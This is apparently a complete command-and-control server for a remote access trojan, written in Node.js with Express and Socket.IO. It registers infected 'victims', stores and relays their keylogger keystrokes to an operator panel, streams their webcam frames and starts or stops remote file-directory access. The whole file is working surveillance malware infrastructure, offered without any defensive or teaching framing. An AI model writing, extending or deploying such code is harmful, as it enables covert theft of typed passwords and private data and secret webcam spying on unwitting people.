const express = require("express");
const app = express();
const http = require("http").createServer(app);
const io = require("socket.io")(http);
require("dotenv/config");

// Require util functions and "Enums"
const { TASK, USER_TYPE, sortVictims, searchVictim } = require("./utils");

// Require database handler
const db = require("./database");

// Connect to database
db.connect();

const port = process.env.PORT || 3000;

// User connected to through Socket.IO
const connectedCommands = new Map(); // Map of connected commands(Hackers :-) )
const connectedVictims = new Map();  // Map of connected victims


// Modify response header to allow Cross Origin Access (CORS)
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", 
        "Origin, X-Requested-With, Content-Type, Accept, Authorization"
    );
    if (req.method === "OPTIONS") {
        res.header("Access-Control-Allow-Methods", "PUT, GET, PATCH, DELETE");
        return res.status(200).json({});
    }
    next();
})

app.use(express.static("viewer"));

app.use(express.json());

//  Request Routes
app.get("/get_victims", (req, res) => {
    try {
        db.getAllVictims()
            .then(victims => {

                const temp = new Map();

                for (const victim of victims)
                    temp.set(victim.uuid, victim);

                for (const victim of Array.from(connectedVictims.values()))
                    temp.set(victim.uuid, victim);

                const result = sortVictims(Array.from(temp.values()));

                console.log(result);
                res.status(200).json(result);
            })
            .catch(error => { throw error; });
    } catch(error) {
        console.error(error);
        res.status(404).json([]);
    }
});

app.get("/get_victim_keystrokes/:uuid", (req, res) => {
    const uuid = req.params.uuid;

    try {
        db.getKeystrokes(uuid)
            .then(keystroke => {
                res.status(200).json(keystroke);
            })
            .catch(error => {
                throw error;
            })
    } catch(error) {
        console.error(error);
        res.status(404).json([]);
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, "viewer", "index.html"));
});


io.on('connection', (socket) => {

    // Add client to online users list
    const userType = socket.handshake.query.userType;                      // Get user type from query parameter

    if (userType === USER_TYPE.VICTIM) {
        console.log("Victim connected");

        const victim = {
            uuid: socket.handshake.query.uuid,
            computerName: socket.handshake.query.computerName
        };

        db.addVictim(victim);                                              // Add victim to database, will not be added if its already in the database.

        const ipAddress = socket.handshake.address.split(":").pop();

        if (searchVictim(Array.from(connectedVictims.values()), victim.uuid) == null)      // Prevent victims connecting from custom Socket.IO namespaces to be added to the Map of connected victims.
            connectedVictims.set(socket.id, {                              // Add victim to connected victims Map with the socket id as the unique key
                socketId: socket.id,
                type: userType,
                ipAddress: (ipAddress.length == 1 || ipAddress == "127.0.0.1")  ? "localhost" : ipAddress,              // If the length of the ip address is less than two, the victim might be running on the same computer as the server.
                ...victim
            });

    }else if (userType === USER_TYPE.COMMAND) {                            // Add command panel to connected admins Map with the socket id as the unique key
        console.log("Command panel connected");
        connectedCommands.set(socket.id, {
            socketId: socket.id,
            type: userType,
            selectedVictim: null
        });        
    }else
        socket.disconnect();                        // Disconnect the socket if the user type is not "Victim" or "Command"
    
    socket.on("disconnect", () => {
        // Delete the disconnected victim if it is in the Map and update command panels or victims
        if (connectedVictims.delete(socket.id)) {
            console.log("Victim disconnected");

            // Check if any command panels are connected and send an array of with online victims to them.
            if (connectedCommands.size > 0) {
                const victims = Array.from(connectedVictims.values());          // Create array from connected victims map values

                for (let socketId of connectedCommands.keys())
                    io.to(socketId).emit("Update connected victims", victims);

            }else if (connectedCommands.size === 0) {                           // If no command panel are connected, emit to all connected victims to turn off their web cameras and file servers.
                console.log("All command panels are disconnected");
                for (let socketId of connectedVictims.keys()) {
                    io.to(socketId).emit("File directory", { "task": TASK.STOP });
                    io.to(socketId).emit("Web camera", { "task": TASK.STOP });
                }
            }

        }else if (connectedCommands.delete(socket.id)) {                        // Deletes the disconnected victim is in the Map and update command panels or other victims.
            console.log("Command panel disconnected");
            if (connectedCommands.size === 0) {                                 // If no command panels are connected, emit to all connected victims to turn off their web cameras and file servers.
                console.log("All command panels are disconnected");
                for (let socketId of connectedVictims.keys()) {
                    io.to(socketId).emit("File directory", { "task": TASK.STOP });
                    io.to(socketId).emit("Web camera", { "task": TASK.STOP });
                }
            }
        }
    });

    socket.on("file_directory", (data) => {
        if (data.task === TASK.START || data.task === TASK.STOP) {
            const victim = searchVictim(connectedVictims.values(), data.victimUUID);
            if (victim != null)
                io.to(victim.socketId).emit("File directory", data);
        }

        console.log("File directory message: ", data);
    });

    socket.on("web_camera", (data) => {
        if ((data.task === TASK.START || data.task === TASK.STOP)) {
            const victim = searchVictim(connectedVictims.values(), data.victimUUID);
            if (victim != null)
                io.to(victim.socketId).emit("Web camera", data);
        }

        console.log("Web camera message: ", data);
    });

    // Not needed since the keylogger is always running
    // socket.on("keystrokes", (data) => {
    //     console.log(data);
    // });

    socket.on("update_selected_victim", (data) => {
        console.log("Updating selected victim: ", data);
        for (let command of connectedCommands.values()) {
            if (command.socketId == socket.id) {
                const victim = searchVictim(connectedVictims.values(), data.selectedVictimUUID);
                if (victim != null)
                    connectedCommands.set(command.socketId, { ...command, selectedVictim: victim });
            }                
        }
    });

});

//  File directory namespace
io.of("/file_directory").on("connect", (socket) => {
    console.log("Client connected to /keystrokes namespace")
    
    socket.on("disconnect", () => {
        console.log("Client disconnected to /keystrokes namespace");
    });

});

//  Web camera namespace
io.of("/web_camera").on("connect", (socket) => {
    const userType = socket.handshake.query.userType;    // Get user type from query parameter
    if (userType == USER_TYPE.VICTIM)
        console.log("Victim connected to /web_camera namespace");
    else if (userType == USER_TYPE.COMMAND)
        console.log("Command panel connected to /web_camera namespace");
    else
        socket.disconnect();

    socket.on("disconnect", () => {
        console.log("victim disconnected to /web_camera namespace");
    })

    socket.on("video_stream", (data) => {
        data.frame = Buffer.from(data.frame, "base64").toString();
        // console.log(data)
        if (connectedCommands.has(data.commandId))
            console.log(`Command panel still online - ${(data.commandId)} - ${(connectedCommands.has(data.commandId))}`);

        io.to(data.commandId).emit("video_stream", data);
    });
});

//  Keystrokes namespaces
io.of("/keystrokes").on("connect", (socket) => {
    console.log("Victim connected to /keystrokes namespace");
    
    socket.on("disconnect", () => {
        console.log("Victim disconnected to /keystrokes namespace");
    })

    socket.on("victim_keystrokes", (data) => {
        const victimUUID = socket.handshake.query.uuid;

        db.addKeystroke(victimUUID, { uuid: victimUUID, ...data });                 // Pass victim's computer's UUID and keystroke data to database

        for (let command of connectedCommands.values())                             // Search for the command that's connected to the victim and send the keystroke
            if (command.selectedVictim && command.selectedVictim.uuid == victimUUID)
                io.to(command.socketId).emit("victim_keystrokes", { uuid: victimUUID, ...data });
    })
})

//  Error handling for invalid routes and for
//  errors that may occur in valid routes.
app.use((req, res, next) => {
    const error = new Error("Not found");
    error.status = 404;
    next(error);
})

app.use((error, req, res, next) => {
    res.status(error.status || 500);

    // Additional information for panel user
    const additionalInfo = {
        name: error.name,
        fileName: error.filename,
        stack: error.stack
    };

    let errorInfo = {
        error: {
            message: error.message,
        }
    };

    if (req.body.sender && req.body.sender === "Panel")
        errorInfo.error = {
            ...errorInfo.error,
            ...additionalInfo
        };

    res.json(errorInfo);
})

http.listen(port, () => {
    console.log(`Server Listening on port: ${port}`);
})